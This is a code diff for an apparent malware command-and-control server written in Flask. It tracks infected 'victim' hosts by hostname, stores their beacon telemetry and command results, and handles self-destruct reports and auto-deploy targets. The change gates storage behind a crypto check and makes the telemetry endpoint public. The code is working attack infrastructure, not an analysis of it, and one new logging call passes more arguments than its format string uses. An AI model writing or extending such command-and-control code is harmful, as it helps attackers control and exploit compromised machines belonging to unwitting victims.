@@ -503,32 +503,34 @@ def telemetry():
     hostname = data.get('hostname')
     if hostname:
         last_seen = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        existing = get_victim(hostname)
 
-        result_text = data.get('result')
-        last_result = existing.get('last_result') if existing else None
-        if result_text:
-            last_result = {'result': result_text}
+        if crypto is not None:
+            existing = get_victim(hostname)
+            result_text = data.get('result')
+            last_result = existing.get('last_result') if existing else None
+            if result_text:
+                last_result = {'result': result_text}
+            stored = {
+                'beacon_data': data,
+                'last_result': last_result,
+            }
+            store_victim(hostname, stored, last_seen)
+            vdata = get_victim(hostname)
+            socketio.emit('victim_update', {'hostname': hostname, 'info': vdata})
+            logger.info("Telemetry from %s: status=%s", hostname, data.get('status'))
+            evaluate_alert_rules(hostname, data, result_text)
 
-        stored = {
-            'beacon_data': data,
-            'last_result': last_result,
-        }
-        store_victim(hostname, stored, last_seen)
-        vdata = get_victim(hostname)
-        socketio.emit('victim_update', {'hostname': hostname, 'info': vdata})
-        logger.info("Telemetry from %s: status=%s", hostname, data.get('status'))
-        evaluate_alert_rules(hostname, data, result_text)
-
-        if result_text:
-            log_command(hostname, 'result', {}, result_text)
-            logger.info("Result from %s: %s", hostname, result_text)
-            if result_text == 'self_destructed':
-                delete_victim(hostname)
-                socketio.emit('victim_removed', {'hostname': hostname})
-            entry = get_command_log(hostname, limit=1)
-            if entry:
-                socketio.emit('command_log_update', {'entry': entry[0]})
+            if result_text:
+                log_command(hostname, 'result', {}, result_text)
+                logger.info("Result from %s: %s", hostname, result_text)
+                if result_text == 'self_destructed':
+                    delete_victim(hostname)
+                    socketio.emit('victim_removed', {'hostname': hostname})
+                entry = get_command_log(hostname, limit=1)
+                if entry:
+                    socketio.emit('command_log_update', {'entry': entry[0]})
+        else:
+            logger.info("Telemetry from %s (locked — not stored)", hostname, data.get('status'))
 
     if hostname and hostname in auto_deploy_targets:
         agent = (data.get('agent') or '').lower()
@@ -775,7 +777,7 @@ def delete_plugin():
 SHUTDOWN_KEY = os.environ.get('C2_SHUTDOWN_KEY', 'shutdown')
 
 
-PUBLIC_ROUTES = ['/api/login', '/api/setup', '/assets/', '/api/shutdown']
+PUBLIC_ROUTES = ['/api/login', '/api/setup', '/assets/', '/api/shutdown', '/api/telemetry']
 
 
 @app.before_request
